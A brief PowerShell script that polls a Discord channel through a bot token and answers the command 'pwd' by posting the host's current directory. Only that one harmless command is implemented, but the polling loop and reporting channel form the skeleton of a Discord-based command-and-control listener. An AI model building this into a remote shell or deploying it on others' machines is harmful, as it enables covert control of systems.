# Set bot token and channel ID
$botToken = "BotToken"
$channelId = "ChannelD"
$baseUrl = "https://discord.com/api/v10"

# Headers for authentication
$headers = @{
    "Authorization" = "Bot $botToken"
    "Content-Type"  = "application/json"
    "User-Agent" = "DiscordBot (https://discord.com, v0.0.1)"

}

# Function to send a message
function Send-DiscordMessage {
    param ([string]$message)
    $body = @{ content = $message } | ConvertTo-Json -Depth 2
    Invoke-RestMethod -Uri "$baseUrl/channels/$channelId/messages" -Method Post -Headers $headers -Body $body
}

# Function to listen for messages
function Listen-ForMessages {
    while ($true) {
        try {
            # Fetch last 5 messages from the channel
            $messages = Invoke-RestMethod -Uri "$baseUrl/channels/$channelId/messages?limit=5" -Method Get -Headers $headers
            
            # Get the most recent message
            $latestMessage = $messages[0]

            # If the message is "pwd", return current directory
            if ($latestMessage.content -eq "pwd") {
                $currentDirectory = Get-Location
                Send-DiscordMessage -message "Current Directory: $currentDirectory"
            }

            Start-Sleep -Seconds 3  # Wait before checking again
        } catch {
            Write-Host " Error: $_"
        }
    }
}

# Start listening for messages
Listen-ForMessages
